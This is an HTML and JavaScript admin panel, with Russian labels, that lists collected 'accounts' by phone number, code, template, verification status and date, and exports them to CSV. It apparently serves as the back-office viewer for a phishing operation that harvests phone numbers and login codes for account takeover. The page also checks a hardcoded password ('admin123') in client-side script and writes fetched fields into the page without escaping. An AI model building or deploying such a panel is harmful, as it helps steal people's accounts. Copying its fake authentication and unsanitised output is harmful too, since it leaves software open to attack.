<!DOCTYPE html>
<html>
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Админ-панель</title>
    <style>
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
        }
        body {
            font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, sans-serif;
            background: #0d1117;
            color: #c9d1d9;
            min-height: 100vh;
            padding: 20px;
        }
        .container {
            max-width: 1200px;
            margin: 0 auto;
        }
        h1 {
            font-size: 28px;
            margin-bottom: 8px;
            color: #f0f6fc;
        }
        .subtitle {
            color: #8b949e;
            margin-bottom: 24px;
        }
        .controls {
            display: flex;
            gap: 12px;
            flex-wrap: wrap;
            margin-bottom: 20px;
            align-items: center;
        }
        .btn {
            padding: 10px 20px;
            border: none;
            border-radius: 8px;
            font-size: 14px;
            font-weight: 600;
            cursor: pointer;
            transition: opacity 0.2s;
            color: #fff;
        }
        .btn:hover {
            opacity: 0.8;
        }
        .btn-refresh {
            background: #238636;
        }
        .btn-export {
            background: #1f6feb;
        }
        .btn-logout {
            background: #da3633;
        }
        .count {
            color: #8b949e;
            margin-left: auto;
        }
        table {
            width: 100%;
            border-collapse: collapse;
            background: #161b22;
            border-radius: 12px;
            overflow: hidden;
        }
        th {
            background: #1c2333;
            color: #8b949e;
            font-weight: 600;
            font-size: 13px;
            text-transform: uppercase;
            padding: 12px 16px;
            text-align: left;
            border-bottom: 1px solid #30363d;
        }
        td {
            padding: 12px 16px;
            border-bottom: 1px solid #21262d;
            font-size: 14px;
        }
        tr:hover td {
            background: #1c2333;
        }
        .status {
            display: inline-block;
            padding: 2px 10px;
            border-radius: 12px;
            font-size: 12px;
            font-weight: 600;
        }
        .status.verified {
            background: #238636;
            color: #fff;
        }
        .status.pending {
            background: #d29922;
            color: #fff;
        }
        .status.error {
            background: #da3633;
            color: #fff;
        }
        .login-box {
            max-width: 400px;
            margin: 100px auto;
            background: #161b22;
            padding: 40px;
            border-radius: 16px;
            text-align: center;
            border: 1px solid #30363d;
        }
        .login-box h2 {
            margin-bottom: 8px;
            color: #f0f6fc;
        }
        .login-box p {
            color: #8b949e;
            margin-bottom: 24px;
        }
        .login-box input {
            width: 100%;
            padding: 12px 16px;
            border-radius: 8px;
            border: 1px solid #30363d;
            background: #0d1117;
            color: #fff;
            font-size: 16px;
            margin-bottom: 16px;
            outline: none;
        }
        .login-box input:focus {
            border-color: #58a6ff;
        }
        .login-box .btn-login {
            width: 100%;
            padding: 12px;
            background: #238636;
            border: none;
            border-radius: 8px;
            color: #fff;
            font-size: 16px;
            font-weight: 600;
            cursor: pointer;
        }
        .login-box .btn-login:hover {
            opacity: 0.8;
        }
        .login-box .error {
            color: #da3633;
            margin-top: 12px;
            display: none;
        }
        .empty-row td {
            text-align: center;
            color: #8b949e;
            padding: 40px;
        }
        .hidden {
            display: none !important;
        }
        .badge {
            display: inline-block;
            padding: 2px 8px;
            border-radius: 4px;
            font-size: 11px;
            font-weight: 600;
            background: #30363d;
            color: #8b949e;
        }
        @media (max-width: 768px) {
            .container { padding: 0; }
            table { font-size: 13px; }
            th, td { padding: 8px 10px; }
            .controls { flex-direction: column; align-items: stretch; }
            .count { margin-left: 0; }
        }
    </style>
</head>
<body>
    <div class="container">

        <!-- ===== ВХОД С ПАРОЛЕМ ===== -->
        <div id="login-box">
            <div class="login-box">
                <h2>🔐 Вход в админ-панель</h2>
                <p>Введите пароль для доступа</p>
                <input type="password" id="password-input" placeholder="Пароль" onkeydown="if(event.key==='Enter') login()">
                <button class="btn-login" onclick="login()">Войти</button>
                <p class="error" id="login-error">Неверный пароль</p>
            </div>
        </div>

        <!-- ===== АДМИН-ПАНЕЛЬ ===== -->
        <div id="admin-panel" class="hidden">
            <h1>📊 Админ-панель</h1>
            <p class="subtitle">Управление данными</p>

            <div class="controls">
                <button class="btn btn-refresh" onclick="loadData()">🔄 Обновить</button>
                <button class="btn btn-export" onclick="exportCSV()">📥 Экспорт CSV</button>
                <button class="btn btn-logout" onclick="logout()">🚪 Выйти</button>
                <span class="count" id="count">Загружено: 0</span>
            </div>

            <table>
                <thead>
                    <tr>
                        <th>#</th>
                        <th>Телефон</th>
                        <th>Код</th>
                        <th>Шаблон</th>
                        <th>Статус</th>
                        <th>Дата</th>
                    </tr>
                </thead>
                <tbody id="accounts-table">
                    <tr class="empty-row"><td colspan="6">Загрузка...</td></tr>
                </tbody>
            </table>
        </div>

    </div>

    <script>
        const ADMIN_PASSWORD = "admin123"; // ← СМЕНИ ПАРОЛЬ

        function login() {
            const input = document.getElementById('password-input').value;
            const error = document.getElementById('login-error');
            if (input === ADMIN_PASSWORD) {
                error.style.display = 'none';
                document.getElementById('login-box').style.display = 'none';
                document.getElementById('admin-panel').classList.remove('hidden');
                loadData();
            } else {
                error.style.display = 'block';
            }
        }

        function logout() {
            document.getElementById('admin-panel').classList.add('hidden');
            document.getElementById('login-box').style.display = 'block';
            document.getElementById('password-input').value = '';
            document.getElementById('login-error').style.display = 'none';
        }

        async function loadData() {
            try {
                const response = await fetch('/api/accounts');
                const data = await response.json();
                const table = document.getElementById('accounts-table');
                const count = document.getElementById('count');

                if (!data || data.length === 0) {
                    table.innerHTML = '<tr class="empty-row"><td colspan="6">Нет аккаунтов</td></tr>';
                    count.textContent = 'Загружено: 0';
                    return;
                }

                count.textContent = `Загружено: ${data.length}`;
                table.innerHTML = data.map((acc, i) => {
                    const statusClass = acc.status || 'pending';
                    const statusLabel = acc.status || 'pending';
                    const date = acc.created_at ? new Date(acc.created_at * 1000).toLocaleString('ru-RU') : '-';
                    const template = acc.template || 'max';
                    return `
                        <tr>
                            <td>${i + 1}</td>
                            <td>${acc.phone || '-'}</td>
                            <td><code>${acc.code || '-'}</code></td>
                            <td><span class="badge">${template}</span></td>
                            <td><span class="status ${statusClass}">${statusLabel}</span></td>
                            <td>${date}</td>
                        </tr>
                    `;
                }).join('');
            } catch (e) {
                console.error(e);
                document.getElementById('accounts-table').innerHTML = '<tr class="empty-row"><td colspan="6">Ошибка загрузки</td></tr>';
            }
        }

        async function exportCSV() {
            try {
                const response = await fetch('/api/accounts');
                const data = await response.json();
                if (!data || data.length === 0) {
                    alert('Нет данных для экспорта');
                    return;
                }
                let csv = 'Телефон,Код,Шаблон,Статус,Дата\n';
                data.forEach(acc => {
                    const date = acc.created_at ? new Date(acc.created_at * 1000).toLocaleString('ru-RU') : '';
                    csv += `${acc.phone || ''},${acc.code || ''},${acc.template || ''},${acc.status || ''},${date}\n`;
                });
                const blob = new Blob(['\uFEFF' + csv], { type: 'text/csv;charset=utf-8' });
                const url = URL.createObjectURL(blob);
                const a = document.createElement('a');
                a.href = url;
                a.download = 'accounts.csv';
                document.body.appendChild(a);
                a.click();
                document.body.removeChild(a);
                URL.revokeObjectURL(url);
            } catch (e) {
                console.error(e);
                alert('Ошибка экспорта');
            }
        }

        // Автообновление каждые 30 секунд
        setInterval(() => {
            if (!document.getElementById('admin-panel').classList.contains('hidden')) {
                loadData();
            }
        }, 30000);
    </script>
</body>
</html>
